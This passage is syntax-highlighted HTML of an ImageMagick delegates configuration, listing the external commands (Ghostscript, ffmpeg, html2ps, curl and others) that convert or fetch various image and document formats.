punctuation">"</span>eps<span class="token punctuation">"</span></span> <span class="token attr-name">encode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ps<span class="token punctuation">"</span></span> <span class="token attr-name">mode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bi<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap<span class="token punctuation">=</span>500000000 -dAlignToPixels<span class="token punctuation">=</span>0 -dGridFitTT<span class="token punctuation">=</span>2 &amp;quot;-sDEVICE<span class="token punctuation">=</span>nodevice&amp;quot; &amp;quot;-sOutputFile<span class="token punctuation">=</span>%o&amp;quot; &amp;quot;-f%i&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fig<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;fig2dev&amp;quot; -L ps &amp;quot;%i&amp;quot; &amp;quot;%o&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>plt<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;echo&amp;quot; &amp;quot;set size 1.25,0.62; set terminal postscript portrait color solid; set output \<span class="token punctuation">'</span>%o\<span class="token punctuation">'</span>; load \<span class="token punctuation">'</span>%i\<span class="token punctuation">'</span>&amp;quot; &amp;gt; &amp;quot;%u&amp;quot;;&amp;quot;gnuplot&amp;quot; &amp;quot;%u&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hpg<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;hp2xx&amp;quot; -q -m eps -f `basename &amp;quot;%o&amp;quot;` &amp;quot;%i&amp;quot;;     mv -f `basename &amp;quot;%o&amp;quot;` &amp;quot;%o&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hpgl<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>if [ -e hp2xx -o -e /usr/bin/hp2xx ]; then     hp2xx -q -m eps -f `basename &amp;quot;%o&amp;quot;` &amp;quot;%i&amp;quot;;     mv -f `basename &amp;quot;%o&amp;quot;` &amp;quot;%o&amp;quot;;   else     echo &amp;quot;You need to install hp2xx to use HPGL files with ImageMagick.&amp;quot;;     exit 1;   fi<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>htm<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;html2ps&amp;quot; -U -o &amp;quot;%o&amp;quot; &amp;quot;%i&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>html<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;html2ps&amp;quot; -U -o &amp;quot;%o&amp;quot; &amp;quot;%i&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;curl&amp;quot; -s -k -o &amp;quot;%o&amp;quot; &amp;quot;https:%M&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ilbm<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;ilbmtoppm&amp;quot; &amp;quot;%i&amp;quot; &amp;gt; &amp;quot;%o&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>man<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;groff&amp;quot; -man -Tps &amp;quot;%i&amp;quot; &amp;gt; &amp;quot;%o&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mpeg:decode<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;ffmpeg&amp;quot; -v -1 -i &amp;quot;%i&amp;quot; -vframes %S -vcodec pam -an -f rawvideo -y &amp;quot;%u.pam&amp;quot; 2&amp;gt; &amp;quot;%Z&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">encode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mpeg:encode<span class="token punctuation">"</span></span> <span class="token attr-name">stealth</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>True<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;ffmpeg&amp;quot; -v -1 -mbd rd -trellis 2 -cmp 2 -subcmp 2 -g 300 -i &amp;quot;%M%%d.jpg&amp;quot; &amp;quot;%u.%m&amp;quot; 2&amp;gt; &amp;quot;%Z&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sid<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;mrsidgeodecode&amp;quot; -if sid -i &amp;quot;%i&amp;quot; -of tif -o &amp;quot;%o&amp;quot; &amp;gt; &amp;quot;%u&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>pcl:color<span class="token punctuation">"</span></span> <span class="token attr-name">stealth</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>True<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;pcl6&amp;quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap<span class="token punctuation">=</span>500000000 -dAlignToPixels<span class="token punctuation">=</span>0 -dGridFitTT<span class="token punctuation">=</span>2 &amp;quot;-sDEVICE<span class="token punctuation">=</span>ppmraw&amp;quot; -dTextAlphaBits<span class="token punctuation">=</span>%u -dGraphicsAlphaBits<span class="token punctuation">=</span>%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile<span class="token punctuation">=</span>%s&amp;quot; &amp;quot;%s&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>pcl:cmyk<span class="token punctuation">"</span></span> <span class="token attr-name">stealth</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>True<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;pcl6&amp;quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap<span class="token punctuation">=</span>500000000 -dAlignToPixels<span class="token punctuation">=</span>0 -dGridFitTT<span class="token punctuation">=</span>2 &amp;quot;-sDEVICE<span class="token punctuation">=</span>pamcmyk32&amp;quot; -dTextAlphaBits<span class="token punctuation">=</span>%u -dGraphicsAlphaBits<span class="token punctuation">=</span>%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile<span class="token punctuation">=</span>%s&amp;quot; &amp;quot;%s&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>pcl:mono<span class="token punctuation">"</span></span> <span class="token attr-name">stealth</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>True<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;pcl6&amp;quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap<span class="token punctuation">=</span>500000000 -dAlignToPixels<span class="token punctuation">=</span>0 -dGridFitTT<span class="token punctuation">=</span>2 &amp;quot;-sDEVICE<span class="token punctuation">=</span>pbmraw&amp;quot; -dTextAlphaBits<span class="token punctuation">=</span>%u -dGraphicsAlphaBits<span class="token punctuation">=</span>%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile<span class="token punctuation">=</span>%s&amp;quot; &amp;quot;%s&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>pdf<span class="token punctuation">"</span></span> <span class="token attr-name">encode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>eps<span class="token punctuation">"</span></span> <span class="token attr-name">mode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bi<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap<span class="token punctuation">=</span>500000000 -dAlignToPixels<span class="token punctuation">=</span>0 -dGridFitTT<span class="token punctuation">=</span>2 &amp;quot;-sDEVICE<span class="token punctuation">=</span>epswrite&amp;quot; &amp;quot;-sOutputFile<span class="token punctuation">=</span>%o&amp;quot; &amp;quot;-f%i&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>pdf<span class="token punctuation">"</span></span> <span class="token attr-name">encode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ps<span class="token punctuation">"</span></span> <span class="token attr-name">mode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bi<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap<span class="token punctuation">=</span>500000000 -dAlignToPixels<span class="token punctuation">=</span>0 -dGridFitTT<span class="token punctuation">=</span>2 &amp;quot;-sDEVICE<span class="token punctuation">=</span>nodevice&amp;quot; &amp;quot;-sOutputFile<span class="token punctuation">=</span>%o&amp;quot; &amp;quot;-f%i&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>tiff<span class="token punctuation">"</span></span> <span class="token attr-name">encode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>launch<span class="token punctuation">"</span></span> <span class="token attr-name">mode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>encode<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;gimp&amp;quot; &amp;quot;%i&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>pnm<span class="token punctuation">"</span></span> <span class="token attr-name">encode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ilbm<span class="token punctuation">"</span></span> <span class="token attr-name">mode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>encode<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;ppmtoilbm&amp;quot; -24if &amp;quot;%i&amp;quot; &amp;gt; &amp;quot;%o&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>pov<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;povray&amp;quot; &amp;quot;+i%i&amp;quot; -D0 &amp;quot;+o%o&amp;quot; +fn%q +w%w +h%h +a -q9 &amp;quot;-kfi%s&amp;quot; &amp;quot;-kff%n&amp;quot;;&amp;quot;convert&amp;quot; -concatenate &amp;quot;%o*.png&amp;quot; &amp;quot;%o&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ps<span class="token punctuation">"</span></span> <span class="token attr-name">encode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>eps<span class="token punctuation">"</span></span> <span class="token attr-name">mode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bi<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap<span class="token punctuation">=</span>500000000 -dAlignToPixels<span class="token punctuation">=</span>0 -dGridFitTT<span class="token punctuation">=</span>2 &amp;quot;-sDEVICE<span class="token punctuation">=</span>epswrite&amp;quot; &amp;quot;-sOutputFile<span class="token punctuation">=</span>%o&amp;quot; &amp;quot;-f%i&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ps<span class="token punctuation">"</span></span> <span class="token attr-name">encode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>pdf<span class="token punctuation">"</span></span> <span class="token attr-name">mode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bi<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap<span class="token punctuation">=</span>500000000 -dAlignToPixels<span class="token punctuation">=</span>0 -dGridFitTT<span class="token punctuation">=</span>2 &amp;quot;-sDEVICE<span class="token punctuation">=</span>pdfwrite&amp;quot; &amp;quot;-sOutputFile<span class="token punctuation">=</span>%o&amp;quot; &amp;quot;-f%i&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ps<span class="token punctuation">"</span></span> <span class="token attr-name">encode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>print<span class="token punctuation">"</span></span> <span class="token attr-name">mode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>encode<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lpr &amp;quot;%i&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ps:alpha<span class="token punctuation">"</span></span> <span class="token attr-name">stealth</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>True<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap<span class="token punctuation">=</span>500000000 -dAlignToPixels<span class="token punctuation">=</span>0 -dGridFitTT<span class="token punctuation">=</span>2 &amp;quot;-sDEVICE<span class="token punctuation">=</span>pngalpha&amp;quot; -dTextAlphaBits<span class="token punctuation">=</span>%u -dGraphicsAlphaBits<span class="token punctuation">=</span>%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile<span class="token punctuation">=</span>%s&amp;quot; &amp;quot;-f%s&amp;quot; &amp;quot;-f%s&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ps:cmyk<span class="token punctuation">"</span></span> <span class="token attr-name">stealth</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>True<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap<span class="token punctuation">=</span>500000000 -dAlignToPixels<span class="token punctuation">=</span>0 -dGridFitTT<span class="token punctuation">=</span>2 &amp;quot;-sDEVICE<span class="token punctuation">=</span>pam&amp;quot; -dTextAlphaBits<span class="token punctuation">=</span>%u -dGraphicsAlphaBits<span class="token punctuation">=</span>%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile<span class="token punctuation">=</span>%s&amp;quot; &amp;quot;-f%s&amp;quot; &amp;quot;-f%s&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ps:color<span class="token punctuation">"</span></span> <span class="token attr-name">stealth</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>True<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap<span class="token punctuation">=</span>500000000 -dAlignToPixels<span class="token punctuation">=</span>0 -dGridFitTT<span class="token punctuation">=</span>2 &amp;quot;-sDEVICE<span class="token punctuation">=</span>pnmraw&amp;quot; -dTextAlphaBits<span class="token punctuation">=</span>%u -dGraphicsAlphaBits<span class="token punctuation">=</span>%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile<span class="token punctuation">=</span>%s&amp;quot; &amp;quot;-f%s&amp;quot; &amp;quot;-f%s&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ps:mono<span class="token punctuation">"</span></span> <span class="token attr-name">stealth</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>True<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;gs&amp;quot; -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap<span class="token punctuation">=</span>500000000 -dAlignToPixels<span class="token punctuation">=</span>0 -dGridFitTT<span class="token punctuation">=</span>2 &amp;quot;-sDEVICE<span class="token punctuation">=</span>pbmraw&amp;quot; -dTextAlphaBits<span class="token punctuation">=</span>%u -dGraphicsAlphaBits<span class="token punctuation">=</span>%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile<span class="token punctuation">=</span>%s&amp;quot; &amp;quot;-f%s&amp;quot; &amp;quot;-f%s&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgba<span class="token punctuation">"</span></span> <span class="token attr-name">encode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rle<span class="token punctuation">"</span></span> <span class="token attr-name">mode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>encode<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;rawtorle&amp;quot; -o &amp;quot;%o&amp;quot; -v &amp;quot;%i&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>scan<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;scanimage&amp;quot; -d &amp;quot;%i&amp;quot; &amp;gt; &amp;quot;%o&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>scanx<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;scanimage&amp;quot; &amp;gt; &amp;quot;%o&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>miff<span class="token punctuation">"</span></span> <span class="token attr-name">encode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>show<span class="token punctuation">"</span></span> <span class="token attr-name">spawn</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>True<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;/usr/bin/display&amp;quot; -delay 0 -window-group %[group] -title &amp;quot;%l &amp;quot; &amp;quot;ephemeral:%i&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>shtml<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;html2ps&amp;quot; -U -o &amp;quot;%o&amp;quot; &amp;quot;%i&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>svg<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;rsvg-convert&amp;quot; -o &amp;quot;%o&amp;quot; &amp;quot;%i&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>txt<span class="token punctuation">"</span></span> <span class="token attr-name">encode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ps<span class="token punctuation">"</span></span> <span class="token attr-name">mode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bi<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;enscript&amp;quot; -o &amp;quot;%o&amp;quot; &amp;quot;%i&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>miff<span class="token punctuation">"</span></span> <span class="token attr-name">encode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>win<span class="token punctuation">"</span></span> <span class="token attr-name">stealth</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>True<span class="token punctuation">"</span></span> <span class="token attr-name">spawn</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>True<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;/usr/bin/display&amp;quot; -immutable -delay 0 -window-group %[group] -title &amp;quot;%l &amp;quot; &amp;quot;ephemeral:%i&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>wmf<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;wmf2eps&amp;quot; -o &amp;quot;%o&amp;quot; &amp;quot;%i&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>xps:color<span class="token punctuation">"</span></span> <span class="token attr-name">stealth</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>True<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;gxps&amp;quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap<span class="token punctuation">=</span>500000000 -dAlignToPixels<span class="token punctuation">=</span>0 -dGridFitTT<span class="token punctuation">=</span>2 &amp;quot;-sDEVICE<span class="token punctuation">=</span>ppmraw&amp;quot; -dTextAlphaBits<span class="token punctuation">=</span>%u -dGraphicsAlphaBits<span class="token punctuation">=</span>%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile<span class="token punctuation">=</span>%s&amp;quot; &amp;quot;%s&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span 